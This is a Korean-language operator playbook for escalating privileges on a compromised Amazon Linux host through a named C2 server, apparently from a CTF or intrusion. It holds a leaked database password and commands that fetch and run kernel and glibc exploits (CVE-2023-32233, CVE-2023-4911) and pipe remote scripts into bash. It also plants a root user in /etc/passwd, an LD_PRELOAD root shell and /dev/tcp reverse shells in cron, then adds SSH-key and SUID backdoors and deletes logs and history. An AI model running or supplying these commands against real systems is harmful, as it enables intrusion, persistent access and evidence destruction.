# 다음 단계 - 권한 상승 실행 가이드

## 현재 상황 요약
- ✅ **리버스 쉘 획득**: apache 사용자로 타겟 접속 중
- ✅ **DB 접근**: MySQL (webuser/WebPassw0rd!)
- ✅ **시스템 정보**: Amazon Linux 2023, Kernel 6.1.155
- ✅ **Ptrace 보호**: 비활성화 (0) - 악용 가능!
- ❌ **권한 상승**: 아직 달성 못함
- ❌ **AWS 크레덴셜**: 만료됨 (사용 불가)

---

## 즉시 실행 순서

### 1단계: 타겟에서 빠른 체크 실행 (5분)

**리버스 쉘에서 실행:**

```bash
# 쉘 안정화 (아직 안했으면)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter 2번
export TERM=xterm

# 빠른 체크 실행
cd /tmp
cat > quick_check.sh << 'EOF'
# 여기에 QUICK_PRIVESC_COMMANDS.sh 내용 붙여넣기
EOF

bash quick_check.sh
```

**또는 한줄로:**

```bash
curl -s http://13.158.67.78:5000/quick_check.sh 2>/dev/null | bash
```

**체크 항목:**
- Netfilter 모듈 로드 여부
- glibc 버전
- Sudo 프로세스 활성화
- Writable /etc 파일

---

### 2단계: C2 서버에서 Exploit 준비 (3분)

**C2 서버 (13.158.67.78)에 접속:**

```bash
# ubuntu@ip-10-0-3-106에서
cd /tmp
mkdir kernel_exploits
cd kernel_exploits

# CVE-2023-32233 다운로드 (가장 유망)
git clone https://github.com/Liuk3r/CVE-2023-32233.git
cd CVE-2023-32233

# 컴파일
gcc -o exploit exploit.c -static -lpthread

# 또는 있는 exploit 사용
ls -la exploit

# HTTP 서버 시작
cd ..
python3 -m http.server 5000 &
```

**HTTP 서버가 이미 실행 중이면 그냥 파일만 추가**

---

### 3단계: CVE-2023-32233 실행 (Netfilter Exploit)

**타겟에서:**

```bash
cd /tmp

# Exploit 다운로드
wget http://13.158.67.78:5000/CVE-2023-32233/exploit 2>/dev/null || \
curl -O http://13.158.67.78:5000/CVE-2023-32233/exploit

# 실행 권한
chmod +x exploit

# 실행
./exploit

# 성공하면 root 쉘!
whoami
id
```

**성공 조건:**
- nf_tables 모듈이 로드되어 있어야 함
- user namespaces 활성화 (기본값)

**실패시 다음 방법으로:**

---

### 4단계: CVE-2023-4911 시도 (Looney Tunables)

**타겟에서 먼저 테스트:**

```bash
# glibc 버전 확인
ldd --version

# 취약 여부 테스트
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=B" /usr/bin/su --help
```

**에러 없으면 취약!**

**C2 서버에서:**

```bash
cd /tmp
git clone https://github.com/leesh3288/CVE-2023-4911.git
cd CVE-2023-4911

# exploit 컴파일
make

# 타겟용으로 static compile
gcc -o exploit exploit.c -static
```

**타겟에서:**

```bash
cd /tmp
wget http://13.158.67.78:5000/CVE-2023-4911/exploit
chmod +x exploit
./exploit

# root 쉘!
```

---

### 5단계: Ptrace 기반 Sudo Token Hijack

**조건:**
- ptrace_scope = 0 ✅ (확인됨)
- 다른 사용자가 최근 sudo 사용

**타겟에서 확인:**

```bash
# Sudo 프로세스 찾기
ps aux | grep sudo

# Sudo timestamp 확인
find /var/lib/sudo/ts -type f -mmin -5 2>/dev/null
find /var/run/sudo/ts -type f -mmin -5 2>/dev/null
```

**있으면:**

```bash
# C2 서버에서 sudo_inject 다운로드
git clone https://github.com/nongiach/sudo_inject.git
cd sudo_inject
make

# 타겟에서
cd /tmp
wget http://13.158.67.78:5000/sudo_inject/exploit
chmod +x exploit
./exploit
```

---

### 6단계: Writable /etc 파일 악용

**타겟에서:**

```bash
# Writable 파일 찾기
find /etc -writable -type f 2>/dev/null

# /etc/passwd가 writable이면
test -w /etc/passwd && echo "WRITABLE!"
```

**만약 writable이면:**

```bash
# 새 root 사용자 추가
openssl passwd -1 -salt hacked hacked
# 결과: $1$hacked$somehash...

echo 'hacked:$1$hacked$생성된해시:0:0:root:/root:/bin/bash' >> /etc/passwd

# 로그인
su hacked
# 비밀번호: hacked
```

---

### 7단계: LD_PRELOAD 라이브러리 주입

**조건:**
- /etc/ld.so.preload writable
- 또는 SUID 바이너리 + LD_PRELOAD

**타겟에서:**

```bash
# evil.so 생성
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

# 컴파일
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# /etc/ld.so.preload에 쓰기 가능하면
echo "/tmp/evil.so" > /etc/ld.so.preload

# 아무 바이너리 실행
/usr/bin/id

# root 쉘!
```

---

### 8단계: Cron Job 백도어

**타겟에서:**

```bash
# Cron 작업 확인
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/* 2>/dev/null

# Writable cron 스크립트 찾기
find /etc/cron* -writable -type f 2>/dev/null
```

**Writable 스크립트가 있으면:**

```bash
# 리버스 쉘 추가
echo 'bash -i >& /dev/tcp/13.158.67.78/4445 0>&1' >> /path/to/writable_script.sh

# 또는 SUID bash 생성
echo 'chmod u+s /bin/bash' >> /path/to/writable_script.sh

# Cron 실행 대기 (최대 1시간)
```

---

## 우선순위 정리

### 최우선 (즉시 시도)
1. **CVE-2023-32233** (Netfilter) - Kernel 6.1.155 타겟
2. **CVE-2023-4911** (Looney Tunables) - glibc 확인 필요
3. **Writable /etc/passwd** - 한번 더 확인

### 중간 우선순위
4. **Ptrace Sudo Token** - 다른 사용자 활동 필요
5. **LD_PRELOAD** - writable /etc/ld.so.preload 필요
6. **Cron Jobs** - 시간 소요

### 최후 수단
7. **DirtyCow** - 오래된 exploit (작동 안할 수 있음)
8. **Kernel Source 분석** - 0-day 찾기 (고급)

---

## 병렬 실행 전략

**터미널 1 (타겟 리버스 쉘):**
```bash
# CVE-2023-32233 시도
cd /tmp
wget http://13.158.67.78:5000/CVE-2023-32233/exploit
chmod +x exploit
./exploit
```

**터미널 2 (C2 서버):**
```bash
# 다음 exploit 준비
cd /tmp
git clone https://github.com/leesh3288/CVE-2023-4911.git
cd CVE-2023-4911
make
```

**터미널 3 (공격자 칼리):**
```bash
# 새 리스너 대기 (백도어용)
nc -lvnp 4445
```

---

## 성공 후 할 일

### Root 획득하면:

```bash
# 1. 확인
whoami  # root
id      # uid=0(root)

# 2. 플래그 찾기
find / -name "flag*.txt" 2>/dev/null
find / -name "*flag*" -type f 2>/dev/null
cat /root/flag.txt
cat /home/*/flag.txt

# 3. 백도어 설치
# SSH 키 추가
mkdir -p /root/.ssh
echo 'ssh-rsa 공개키...' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# SUID bash
cp /bin/bash /tmp/.hidden_shell
chmod u+s /tmp/.hidden_shell

# Cron 백도어
echo '*/5 * * * * root bash -i >& /dev/tcp/13.158.67.78/4445 0>&1' >> /etc/crontab

# 4. 증거 정리
history -c
rm -f /var/log/auth.log
rm -f ~/.bash_history
```

---

## 문제 해결

### Exploit 다운로드 실패
```bash
# wget 없으면
curl -O http://13.158.67.78:5000/file

# 둘 다 없으면
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://13.158.67.78:5000/file", "file")'
```

### 컴파일 실패
```bash
# gcc 없으면 C2 서버에서 컴파일 후 전송
# static으로 컴파일 필수
gcc -static -o exploit exploit.c
```

### Exploit 실행 실패
```bash
# 권한 확인
chmod +x exploit

# 실행
./exploit

# strace로 디버깅
strace -f ./exploit
```

---

## 요약 명령어

**타겟에서 한번에 실행:**

```bash
cd /tmp && \
wget http://13.158.67.78:5000/quick_check.sh && \
bash quick_check.sh && \
wget http://13.158.67.78:5000/CVE-2023-32233/exploit && \
chmod +x exploit && \
./exploit && \
whoami
```

---

**C2 서버 준비:**

```bash
cd /tmp && \
git clone https://github.com/Liuk3r/CVE-2023-32233.git && \
cd CVE-2023-32233 && \
gcc -o exploit exploit.c -static -lpthread && \
cd .. && \
python3 -m http.server 5000
```

---

## 실시간 가이드

1. **지금 바로:** CVE-2023-32233 시도
2. **안되면:** CVE-2023-4911 시도
3. **안되면:** Writable /etc 재확인
4. **안되면:** LinPEAS 재실행 (더 자세히)
5. **안되면:** 다른 웹 취약점 찾기 (관리자 페이지 등)

---

**작성일:** 2025-11-07
**상태:** 권한 상승 대기중
**타겟:** 3.34.181.145 (Amazon Linux 2023)
**C2:** 13.158.67.78 (ubuntu@ip-10-0-3-106)
